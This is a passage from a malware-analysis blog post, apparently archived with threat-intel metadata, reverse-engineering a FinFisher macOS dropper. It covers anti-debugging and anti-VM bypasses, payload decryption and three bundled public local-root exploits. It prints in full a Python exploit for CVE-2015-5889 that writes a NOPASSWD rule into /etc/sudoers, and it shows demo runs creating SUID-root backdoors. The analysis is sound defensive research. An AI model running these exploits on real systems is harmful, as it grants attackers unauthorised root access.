\"launch\");\nobjc_msgSend(v37, \"waitUntilExit\");\nLOBYTE(v54) = (unsigned int)objc_msgSend(v37, \"terminationStatus\") == 0;\n\n Translated to Objective-C:\nNSTask *task = [[NSTask alloc] init];\n[task setLaunchPath:@\"/bin/sh\"];\nNSString *cmd = [NSString stringWithFormat:\"%@\", @\"system_profiler SPUSBDataType |\negrep -i \\\"Manufacturer: (parallels|vmware|virtualbox)\\\"\"];\nNSArray *args = [NSArray arrayWithObjects: @\"-c\", cmd, nil];\n[task setArguments:args];\nNSPipe *pipe = [NSPipe pipe];\n[task setStandardOutput:pipe];\nNSFileHandle *file = [pipe fileHandleForReading];\n[task launch];\n[task waitUntilExit];\nint ret = [task terminationStatus] == 0;\n\n```\n\n-----\n\n## It will essentially execute a shell command via NSTask class. The easiest way to bypass this is to modify the string since the CoreFoundation String (CFString) points to a C string.\n```\n__cstring:10002B620 aSystemProfiler db 'system_profiler SPUSBDataType | egrep -i\n\"Manufacturer: (parallels|vmware|virtualbox)\"',0\n__cstring:10002B620            ; DATA XREF:\n__cfstring:cfstr_SystemProfiler↓o\n\n If the command doesn’t return the information it’s looking then whatever test the code is doing will fail and we should bypass the vm detection easily. We just need to overwrite the\ngrep string or modify the shell command to return nothing and exit early.\n\n In my case I opted to modify the string to \"system_profiler SPUSBDataType | egrep i \"Manufacturer: (finfisher clowns u suck aha)\"\" . For this we don’t need a\n\n breakpoint since we can modify the memory for the string at the first breakpoint for example, when we bypass the ptrace. Or we can just patch the binary since there are no integrity checks anyway.\n\n And gone are all anti-debugging and anti-vm checks. That wasn’t hard!\n\n Somewhere in the middle of main code we can find this:\n__text:100001DEF loc_100001DEF:        ; CODE XREF: _main+248↑j\n__text:100001DEF  cmp   eax, 0D7F98BB5h\n__text:100001DF4  jnz   loc_100001891\n__text:100001DFA  mov   edi, [rbp+argc] ; argc\n__text:100001E00  mov   rsi, [rbp+argv] ; argv\n__text:100001E07  call  _NSApplicationMain\n__text:100001E0C  mov   [rbp+var_300], eax\n__text:100001E12  mov   eax, 0CDACC4F9h\n__text:100001E17  jmp   loc_100001891\n\n This means this is a AppKit application. NSApplicationMain is responsible for creating and running the application. What we have seen until now is just a prologue.\n\n An astute reader will notice that there is an even easier way to bypass all the previous checks with a single breakpoint. Let me show you how. The prototype for\nNSApplicationMain is:\nint NSApplicationMain(int argc, const char * _Nonnull *argv);\n\n Since there are no interesting operations in main other than anti-debugging and anti-vm checks, we could simply bypass all that code and set execution directly to\nNSApplicationMain . The following are the interesting parts of main to achieve this:\n\n```\n\n-----\n\n```\n__text:10000174F  push  rbp\n__text:100001750  mov   rbp, rsp\n__text:100001753  push  r15       ; break here\n__text:100001753              ; and set RIP to 0x100001DFA -.\n(...)                                   |\n__text:100001DFA  mov   edi, [rbp+argc] ; argc <----------------------´\n__text:100001E00  mov   rsi, [rbp+argv] ; argv\n__text:100001E07  call  _NSApplicationMain\n\n## We can set a breakpoint at address 0x100001753 (remember that software breakpoint is triggered before instruction is executed - because the original instruction is replaced with\nint3 instruction) and modify the instruction pointer to address 0x100001DFA . We need to\n\n do it like this because the arguments are referenced as an offset of the frame pointer register rbp . If we had set the breakpoint at address 0x10000174F then the argc reference would be pointing to wrong memory. It is possible to do it this way, we just need to fix the rbp address to the right value (stack grows to lower addresses, so this would be current rsp value - 8). Easier to just breakpoint after the correct rbp is set.\n\n Now back to tracing post NSApplicationMain execution.\n\n There is no need to single step execution into NSApplicationMain . There are a series of delegates for NSApplication and at least one or two are usually implemented in normal applications. These delegates execute before the real application starts running, so we can breakpoint them to regain debugger control after the call to NSApplicationMain .\n\n In this case applicationDidFinishLaunching: (doc) is the only delegate available. Right away we can observe interesting method names that we want to investigate.\n\n```\n\n-----\n\n```\n__text:10000275C  push  rbp\n__text:10000275D  mov   rbp, rsp\n__text:100002760  push  r15\n__text:100002762  push  r14\n__text:100002764  push  r13\n__text:100002766  push  r12\n__text:100002768  push  rbx\n__text:100002769  sub   rsp, 18h\n__text:10000276D  mov   rbx, rdi\n__text:100002770  mov   rdi, rdx    ; id\n__text:100002773  call  cs:_objc_retain_ptr\n__text:100002779  call  _objc_autoreleasePoolPush\n__text:10000277E  mov   [rbp+context], rax\n__text:100002782  mov   rsi, cs:selRef_removeOldResource ; SEL\n__text:100002789  mov   r14, cs:_objc_msgSend_ptr\n__text:100002790  mov   rdi, rbx    \n__text:100002793  call  r14 ; _objc_msgSend ; -[appAppDelegate\nremoveOldResource]\n__text:100002796  mov   rsi, cs:selRef_expandPayload ; SEL\n__text:10000279D  mov   rdi, rbx\n__text:1000027A0  call  r14 ; _objc_msgSend ; -[appAppDelegate expandPayload]\n__text:1000027A3  mov   rsi, cs:selRef_executeTrampoline ; SEL\n__text:1000027AA  mov   rdi, rbx\n__text:1000027AD  call  r14 ; _objc_msgSend ; -[appAppDelegate\nexecuteTrampoline]\n__text:1000027B0  mov   rsi, cs:selRef_installPayload ; SEL\n__text:1000027B7  mov   rdi, rbx    ; id\n__text:1000027BA  call  r14 ; _objc_msgSend ; -[appAppDelegate installPayload]\n__text:1000027BD  movsx  eax, al\n__text:1000027C0  mov   [rbp+var_2C], eax\n__text:1000027C3  mov   r15, cs:selRef_askUserPermission_\n__text:1000027CA  mov   r12, cs:selRef_installPayload\n__text:1000027D1  mov   eax, 464B731Fh\n__text:1000027D6  jmp   short loc_1000027DD\n\n## At least two method names look interesting, expandPayload and installPayload . Amnesty report discusses an encrypted payload so this is a good clue and we definitely want to take a look at those methods.\n\n The removeOldResource method cleans up the temporary payload environment. It uses the +[GIPath compressedPayload] class method to build the temporary path to this payload. On my High Sierra VM, the temporary path is\n/Users/username/Library/Caches/arch.zip, while in Amnesty report is\n\n```\n\n-----\n\n```\nid __cdecl +[GIPath compressedPayload](id a1, SEL a2)\n{\n id v2; // rax\n id v3; // r14\n id v4; // rax\n id v5; // rbx\n // returns @\"/Users/username/Library/Caches\"\n v2 = +[GIPath systemTemp](&OBJC_CLASS___GIPath, \"systemTemp\");\n v3 = objc_retainAutoreleasedReturnValue(v2);\n v4 = objc_msgSend(v3, \"stringByAppendingPathComponent:\", CFSTR(\"arch.zip\"));\n v5 = objc_retainAutoreleasedReturnValue(v4);\n objc_release(v3);\n return objc_autoreleaseReturnValue(v5);\n}\n\n## The path to the extracted payload is built with +[GIPath expandedPayload] class method. In my case /Users/username/Library/Caches/org.logind.ctp.archive .\n\n More interesting is the expandPayload method. This is where the encrypted payload is decrypted and extracted for later persistence installation in the target system. The encrypted payload is the data file found in Resources folder of the hidden application ARA0848.app/Contents/Resources/data .\n\n Without going too much into detail about this method, what it does is to decrypt the data payload to /Users/username/Library/Caches/arch.zip by XOR’ing with the key “NSString”, and then extract that ZIP file to\n/Users/username/Library/Caches/org.logind.ctp.archive .\n\n Amnesty released a script to decrypt the payload but I couldn’t get it to work. Instead it’s just easier to recover the decrypted payload from memory or the extracted version from the filesystem.\n\n The memory buffer for the decrypted version is allocated here:\n__text:100002F88  call  r12 ; _objc_msgSend ; [NSConcreteData length]\n__text:100002F8B  mov   rdi, rax    ; 0x0000000000158712\n__text:100002F8B              ; size of data payload (1410834 bytes)\n__text:100002F8E  call  _malloc\n__text:100002F93  mov   [rbp+var_58], rax\n\n So we just need to set a breakpoint at address 0x100002F93, recover the value of rax register, and find where the decryption loop ends. We can also just find out where it tries to write the buffer to the filesystem and breakpoint there so we can copy it from the filesystem (in this case it’s not deleted right away, only later on).\n\n A good place is here:\n\n```\n\n-----\n\n```\n__text:100003080  call  r12 ; _objc_msgSend ; +[GIPath compressedPayload]\n__text:100003083  mov   rdi, rax    ;\n/Users/username/Library/Caches/arch.zip\n__text:100003086  call  _objc_retainAutoreleasedReturnValue\n__text:10000308B  mov   r15, rax\n__text:10000308E  mov   ecx, 1\n__text:100003093  mov   rdi, r14    ; id\n__text:100003096  mov   rax, cs:selRef_writeToFile_atomically_\n__text:10000309D  mov   rsi, rax    ; SEL\n__text:1000030A0  mov   rdx, r15    ; makes a copy of the decrypted payload\nhere\n__text:1000030A3  call  r12 ; _objc_msgSend ; [OS_dispatch_data\nwriteToFile:atomically:]\n__text:1000030A6  mov   rdi, r15    ; id\n\n## If we set a breakpoint at 0x1000030A6 we can just copy the decrypted archive\n/Users/username/Library/Caches/arch.zip from the filesytem.\n\n We can now take a peek at the payload:\n\n```\n\n-----\n\n```\norg.logind.ctp.archive\n├── helper\n├── helper2\n├── helper3\n├── installer\n├── logind\n├── logind.kext\n│  └── Contents\n│    ├── Info.plist\n│    ├── MacOS\n│    │  └── logind\n│    └── Resources\n│      └── en.lproj\n│        └── InfoPlist.strings\n├── logind.plist\n└── storage.framework\n  └── Contents\n    ├── Info.plist\n    ├── MacOS\n    │  └── logind\n    ├── PkgInfo\n    └── Resources\n      ├── 7f.bundle\n      │  └── Contents\n      │    ├── Info.plist\n      │    ├── MacOS\n      │    │  └── 7f\n      │    └── Resources\n      │      ├── 7FC.dat\n      │      └── AAC.dat\n      ├── 80C.dat\n      ├── dataPkg\n      └── logind.plist\n13 directories, 19 files\n\n## Amnesty report describes two exploits but this version contains three. All the exploits are public, so no 0days here. Nothing like packaging free work and selling it for big bucks :-].\n\n The third exploit is a public exploit by qwertyoruiop called tpwn. Comparing strings between\nhelper3 binary and public source code:\n\n Helper3\n\n```\n\n-----\n\n```\n__cstring:00003ECB aProcUcred   db _proc_ucred,0   ; DATA XREF: start+129C↑o\n__cstring:00003ED7 aPosixCredGet  db '_posix_cred_get',0\n__cstring:00003EE7 aChgproccnt   db '_chgproccnt',0\n__cstring:00003EF3 aIorecursiveloc db '_IORecursiveLockUnlock',0\n__cstring:00003F0A aZn10ioworkloop db '__ZN10IOWorkLoop8openGateEv',0\n__cstring:00003F0A                     ; DATA XREF: start+1DE3↑o\n__cstring:00003F26 aZn13ioeventsou db '__ZN13IOEventSource8openGateEv',0\n__cstring:00003F45 aEscalatingPriv db 'Escalating privileges! -qwertyoruiop',0Ah,0\n__cstring:00003F45                     ; DATA XREF: start+2138↑o\n__cstring:00003F6B aIolog     db '_IOLog',0      ; DATA XREF: start+2150↑o\n__cstring:00003F72 aThreadExceptio db '_thread_exception_return',0\n__cstring:00003F8B aChmod06777S  db 'chmod 06777 %s',0\n__cstring:00003F9A aChownRootWheel db 'chown root:wheel %s',0\n\n## Source code\n  PUSH_GADGET(stack) = RESOLVE_SYMBOL(mapping_kernel, \"_IORecursiveLockUnlock\");\n  PUSH_GADGET(stack) = ROP_POP_RAX(mapping_kernel);\n  PUSH_GADGET(stack) = heap_info[1].kobject+0xe0;\n  PUSH_GADGET(stack) = ROP_READ_RAX_TO_RAX_POP_RBP(mapping_kernel);\n  PUSH_GADGET(stack) = JUNK_VALUE;\n  PUSH_GADGET(stack) = ROP_RAX_TO_ARG1(stack,mapping_kernel);\n  PUSH_GADGET(stack) = RESOLVE_SYMBOL(mapping_kernel,\n\"__ZN10IOWorkLoop8openGateEv\");\n  PUSH_GADGET(stack) = ROP_POP_RAX(mapping_kernel);\n  PUSH_GADGET(stack) = heap_info[1].kobject+0xe8;\n  PUSH_GADGET(stack) = ROP_READ_RAX_TO_RAX_POP_RBP(mapping_kernel);\n  PUSH_GADGET(stack) = JUNK_VALUE;\n  PUSH_GADGET(stack) = ROP_RAX_TO_ARG1(stack,mapping_kernel);\n  PUSH_GADGET(stack) = RESOLVE_SYMBOL(mapping_kernel,\n\"__ZN13IOEventSource8openGateEv\");\n  PUSH_GADGET(stack) = ROP_ARG1(stack, mapping_kernel, (uint64_t)\"Escalating\nprivileges! -qwertyoruiop\\n\")\n  PUSH_GADGET(stack) = RESOLVE_SYMBOL(mapping_kernel, \"_IOLog\");\n  PUSH_GADGET(stack) = RESOLVE_SYMBOL(mapping_kernel, \"_thread_exception_return\");\n\n They match and they didn’t even bother to modify the strings. Pathetic. Pfttttt!\n\n All the exploits target macOS Yosemite or older, giving another potential clue about how old this version might be. The tpwn exploit is from 2015.\n\n Let’s get back to applicationDidFinishLaunching analysis to understand how the exploits are used. After the payload is decrypted and extracted, the next executed method is\nexecuteTrampoline . Another three methods are referenced inside:\n\n [appAppDelegate isAfterPatch]\n [appAppDelegate launchNewStyle]\n [appAppDelegate launchOldStyle]\n\n```\n\n-----\n\n## The first to be executed is isAfterPatch . It verifies if the target system is on a given OS release or not. This is used to make the decision to execute new or old style exploits.\n\n The launchOldStyle tries to execute the helper exploit. If Amnesty exploit reference is correct, this is a very old exploit written in 2010, tested against 10.8.X, and apparently fixed in 2013 or 2014.\n\n We can test the original exploit against a Mountain Lion 10.8.5 VM:\n```\n$ uname -an\nDarwin mountain-lion-64.local 12.5.0 Darwin Kernel Version 12.5.0: Mon Jul 29\n16:33:49 PDT 2013; root:xnu-2050.48.11~1/RELEASE_X86_64 x86_64\n$ clang -o exploit exploit.m -framework Foundation -framework SecurityFoundation\n$ ./exploit /bin/sleep /tmp/backd00r\nApple MACOS X < 10.9/10? local root exploit\nby: <mu-b@digit-labs.org>\nhttp://www.digit-labs.org/ -- Digit-Labs 2010!@$!\n* Found Authenticator Class!\n* found UserUtilities Class!\n* authenticateUsingAuthorizationSync:authObj returned: 1\n* now execute suid backdoor at /tmp/backd00r\n$ ls -la /tmp/backd00r\n-r-s--x--x 1 root wheel 14080 Sep 28 03:24 /tmp/backd00r\n$ /tmp/backd00r 60 &\n[1] 495\n$ ps u -p 495\nUSER  PID %CPU %MEM   VSZ  RSS  TT STAT STARTED   TIME COMMAND\nroot  495  0.0 0.0 2432748  464 s000 S   3:25AM  0:00.00 /tmp/backd00r 60\n\n The exploit works as described. The source argument is copied to the selected target and made SUID root.\n\n The helper binary contains this exploit in do_assistive_copy function but will ask for user permission if exploit fails. This good old social engineering dialog happens at\ndo_ask_user_permission function.\n$ nm helper -s __TEXT __text \n(...)\n0000000100003277 t _do_ask_user_permission\n0000000100002470 t _do_assistive_copy\n(...)\n\n Let’s get back to launchOldStyle method to understand how helper is called.\n\n The Objective-C code is something like this:\n\n```\n\n-----\n\n```\nNSNumber perm [NSNumber numberWithUnsignedLong:0755];\nNSNumber *user = [NSNumber numberWithUnsignedLong:0];\nNSNumber *group = [NSNumber numberWithUnsignedLong:0];\nNSDictionary *attr = [NSDictionary dictionaryWithObjectsAndKeys:\n            perm, NSFilePosixPermissions,\n            user, NSFileOwnerAccountID,\n            group, NSFileGroupOwnerAccountID,\n            nil];\nNSFileManager *fm = [[NSFilemanager alloc] init];\n// returns path to extracted zip payload + helper\nNSString *helperPath = [GIPath trampoline];\n[fm setAttributes:attr ofItemAtPath:helperPath error:nil];\nNSTask *task = [[NSTask alloc] init];\n// returns path to extracted zip payload + helper\nNSString *launchPath = [GIPath trampoline];\n[task setLaunchPath:launchPath];\n// returns path to extracted zip payload + installer\nNSString *installerPath = [GIPath installer]\n// returns path to extracted zip payload\nNSString *payloadPath = [GIPath expandedPayload];\nNSArray *args = [NSArray arrayWithObjects:installerPath, payloadPath, nil];\n[task setArguments:args];\n[task launch];\n[task waitUntilExit];\nint status = [task terminationStatus];\n\n## The helper binary is called with arguments\n/Users/username/Library/Caches/org.logind.ctp.archive/installer (part of the\n\n extracted payload) and /Users/username/Library/Caches/org.logind.ctp.archive (the extracted payload folder path). The original exploit requires the target file, this version just the path.\n\n With this information we can test the helper binary in a vulnerable virtual machine:\n$ ./helper /bin/sleep /tmp/\n$ ls -la /tmp/sleep \n-rwsrwsrwx 1 root wheel 14080 Sep 28 05:24 /tmp/sleep\n\n But if we execute it in a non-vulnerable macOS version:\n$ ./helper /bin/sleep /tmp/\n2020-09-28 05:26:48.452 helper[2234:193615] ### No entitlement for\nSystemAdministration !!!\n2020-09-28 05:26:48.460 helper[2234:193620] ### syncProxyWithSemaphore error:Error\nDomain=NSCocoaErrorDomain Code=4097 \"connection to service named\ncom.apple.systemadministration.writeconfig\" UserInfo={NSDebugDescription=connection\nto service named com.apple.systemadministration.writeconfig}\n\n```\n\n-----\n\n## If the exploit fails we get a prompt to insert the password aka do_ask_user_permission is executed:\n\n But in this case the argument logic is a bit different. The first argument is the target binary to modify permissions (the exploit instead makes a copy and then modifies the permissions in the copy).\n```\n$ cp /bin/sleep /tmp\n$ ls -la /tmp/sleep \n-rwxr-xr-x 1 reverser wheel 18080 Sep 28 18:39 sleep\n$ ./helper_patched /tmp/sleep /tmp\n(Insert password interruption...clicky click)\n$ ls -la /tmp/sleep\n-rwsrwsrwx 1 root   wheel 18080 Sep 28 18:39 sleep\n\n In this case I patched helper_patched to bypass the do_assistive_copy exploit and go directly to the do_ask_user_permission method. The patch is just remove the call and replace with code to set eax to 1.\n__text:10000242C E8 3F 00 00 00  call  _do_assistive_copy ; 0 on success, 1 on\nfailure\n__text:100002431 48 8B 4D B8    mov   rcx, [rbp+var_48]\n__text:100002435 89 01       mov   [rcx], eax   \n\n In a vulnerable system the exploit will make\n/Users/username/Library/Caches/org.logind.ctp.archive/installer binary SUID\n\n root so it can run with higher privileges for persistence installation purposes.\n\n This binary has the same name as the initial dropper but it’s a stripped down version (no unzip capabilities, no anti-debugging/anti-vm, no exploit usage) used to install system persistence.\n\n Let’s continue analysis of the other exploits.\n\n The launchNewStyle method will try to execute the helper2 exploit. The exploit is the following Python script:\n\n```\n\n-----\n\n```\n# CVE 2015 5889: issetugid() + rsh + libmalloc osx local root\n# tested on osx 10.9.5 / 10.10.5\n# jul/2015\n# by rebel\nimport os,time,sys\nfrom sys import argv\nscript, param = argv\nenv = {}\ns = os.stat(\"/etc/sudoers\").st_size\nenv['MallocLogFile'] = '/etc/crontab'\nenv['MallocStackLogging'] = 'yes'\nenv['MallocStackLoggingDirectory'] = 'a\\n* * * * * root echo \"ALL ALL=(ALL)\nNOPASSWD: ALL\" >> /etc/sudoers\\n\\n\\n\\n\\n'\n#sys.stderr.write(\"creating /etc/crontab..\")\np = os.fork()\nif p == 0:   \n    os.close(1)\n    os.close(2)\n    os.execve(\"/usr/bin/rsh\",[\"rsh\",\"localhost\"],env)\ntime.sleep(1)\nif \"NOPASSWD\" not in open(\"/etc/crontab\").read():\n    sys.stderr.write(\"failed\\n\")\n    sys.exit(-1)\n#sys.stderr.write(\"done\\nwaiting for /etc/sudoers to change (<60 seconds)..\")\nwhile os.stat(\"/etc/sudoers\").st_size == s:\n#    sys.stderr.write(\".\")  \n    time.sleep(1)\n#sys.stderr.write(\"\\ndone\\n\")\nmy_command = \"sudo chmod 06777 %s & sudo chown root:wheel %s\" % (param, param)\nos.system(my_command)\n\n## The exploit argument is the target to modify to SUID root if exploit is successful. In this case it will be the installer binary inside the extracted payload, as the previous exploit.\n\n If the exploit was successful, the method will return one, zero otherwise.\n\n Running against Mountain Lion 10.8.5 system:\n\n```\n\n-----\n\n```\n$ cp /bin/sleep /tmp\n$ ls -la /tmp/sleep \n-rwxr-xr-x 1 reverser wheel 14080 Sep 28 19:45 /tmp/sleep\n$ python helper2 /tmp/sleep \nfailed\n\n## Running against a vulnerable Mavericks 10.9.5 system:\n$ cp /bin/sleep /tmp\n$ ls -la /tmp/sleep \n-rwxr-xr-x 1 reverser wheel 14080 Sep 28 19:47 /tmp/sleep\n$ python helper2 /tmp/sleep\n(wait a minute for next crontab execution)\n$ ls -la /tmp/sleep \n-rwsrwsrwx 1 root wheel 14080 Sep 28 19:47 /tmp/sleep\n\n The exploit leaves (too many) traces in the target system and no code (as far as I can see) exists to clean it up:\n$ sudo tail /etc/sudoers \n# %wheel  ALL=(ALL) NOPASSWD: ALL\n# Samples\n# %users ALL=/sbin/mount /cdrom,/sbin/umount /cdrom\n# %users localhost=/sbin/shutdown -h now\nALL ALL=(ALL) NOPASSWD: ALL\nALL ALL=(ALL) NOPASSWD: ALL\nALL ALL=(ALL) NOPASSWD: ALL\nALL ALL=(ALL) NOPASSWD: ALL\nALL ALL=(ALL) NOPASSWD: ALL\n$ sudo tail /etc/crontab\n'\nrlogin(876,0x7fff7a2c4310) malloc: stack logs being written into /tmp/stacklogs.876.1002df000.rlogin.Ers4v2.index\nrlogin(876,0x7fff7a2c4310) malloc: recording malloc and VM allocation stacks to disk\nusing standard recorder\nrlogin(876,0x7fff7a2c4310) malloc: stack logs deleted from /tmp/stacklogs.876.1002df000.rlogin.Ers4v2.index\nrlogin(1038,0x7fff7a2c4310) malloc: MallocStackLoggingDirectory env var set to\nunwritable path 'a\n* * * * * root echo \"ALL ALL=(ALL) NOPASSWD: ALL\" >> /etc/sudoers\n\n There are no references to helper3 exploit, so it might have been packaged by mistake or waiting for updated dropper, or just a replacement for helper2 exploit.\n\n This ends up the analysis of executeTrampoline method called from\napplicationDidFinishLaunching .\n\n The next method is -[appAppDelegate installPayload] . If everything went as expected up to this moment, the dropper was able to extract its payload to\n/Users/username/Library/Caches/org.logind.ctp.archive/ folder and managed to\n\n```\n\n-----\n\n## set the installer binary SUID root. The -[appAppDelegate installPayload] method will just execute the SUID binary responsible for persistence installation.\n```\nhar __cdecl -[appAppDelegate installPayload](appAppDelegate *self, SEL a2)\n{\n NSTask *v2; // rax\n NSTask *v3; // r14\n id v4; // rax\n id v5; // rbx\n sleep(2u);\n // NSTask *task = [[NSTask alloc] init];\n v2 = objc_msgSend(&OBJC_CLASS___NSTask, \"alloc\");\n v3 = objc_msgSend(v2, \"init\");\n // retrieve path to SUID binary:\n/Users/username/Library/Caches/org.logind.ctp.archive/installer\n v4 = +[GIPath installer](&OBJC_CLASS___GIPath, \"installer\");\n v5 = objc_retainAutoreleasedReturnValue(v4);\n // set the binary to execute\n objc_msgSend(v3, \"setLaunchPath:\", v5);\n objc_release(v5);\n // execute the binary\n objc_msgSend(v3, \"launch\");\n // wait for its exit\n objc_msgSend(v3, \"waitUntilExit\");\n LOBYTE(v5) = (unsigned int)objc_msgSend(v3, \"terminationStatus\") == 0;\n objc_release(v3);\n return (char)v5;\n}\n\n As I wrote before, this installer is kind of a stripped down version of the dropper. Its hash is ac414a14464bf38a59b8acdfcdf1c76451c2d79da0b3f2e53c07ed1c94aeddcd .\n\n The last method to be executed by the dropper is -[appAppDelegate removeTraces] . It simply removes the decrypted zip file, the extracted payload folder, and the malicious application where the dropper was executed from. This will be executed whether\ninstallPayload is successful or not.\n\n This closes the analysis of the main dropper binary. Next is the SUID installer to understand the persistence operations. That’s chapter 2.\n\n Have fun, fG!\n\n P.S.: Sorry for the ugly code highlighting, I need to customize a better theme.\n\n ← Previous Post Next Post →\n\n```\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2020/2020-09-26 - The Finfisher Tales, Chapter 1- The dropper.pdf"
    ],
    "report_names": [
        "2020-09-26 - The Finfisher Tales, Chapter 1- The dropper.pdf"
    ],
    "threat_actors": [
        {
            "id": "a3687241-9876-477b-aa13-a7c368ffda58",
            "created_at": "2022-10-25T16:07:24.496902Z",
            "updated_at": "2025-03-27T02:02:10.256629Z",
            "deleted_at": null,
            "main_name": "Hacking Team",
            "aliases": [],
            "source_name": "ETDA:Hacking Team",
            "tools": [],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "e90c06e4-e3e0-4f46-a3b5-17b84b31da62",
            "created_at": "2023-01-06T13:46:39.018236Z",
            "updated_at": "2025-03-27T02:00:02.978356Z",
            "deleted_at": null,
            "main_name": "Hacking Team",
            "aliases": [],
            "source_name": "MISPGALAXY:Hacking Team",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "af509bbb-8d18-4903-a9bd-9e94099c6b30",
            "created_at": "2023-01-06T13:46:38.585525Z",
            "updated_at": "2025-03-27T02:00:02.866727Z",
            "deleted_at": null,
            "main_name": "APT32",
            "aliases": [
                "TIN WOODLAWN",
                "OceanLotus Group",
                "OceanLotus",
                "Sea Lotus",
                "G0050",
                "Cobalt Kitty",
                "SeaLotus",
                "ATK17",
                "Ocean Lotus",
                "Ocean Buffalo",
                "POND LOACH",
                "Canvas Cyclone",
                "APT-C-00",
                "APT-32",
                "APT 32"
            ],
            "source_name": "MISPGALAXY:APT32",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        }
    ],
    "ts_created_at": 1673535557,
    "ts_updated_at": 1743041126,
    "ts_creation_date": 1653757809,
    "ts_modification_date": 1653757809,
    "files": {
        "pdf": "https://archive.orkl.eu/89645f084c7ce164056fe829e0930789ccf19a2f.pdf",
        "text": "https://archive.orkl.eu/89645f084c7ce164056fe829e0930789ccf19a2f.txt",
        "img": "https://archive.orkl.eu/89645f084c7ce164056fe829e0930789ccf19a2f.jpg"
    }
}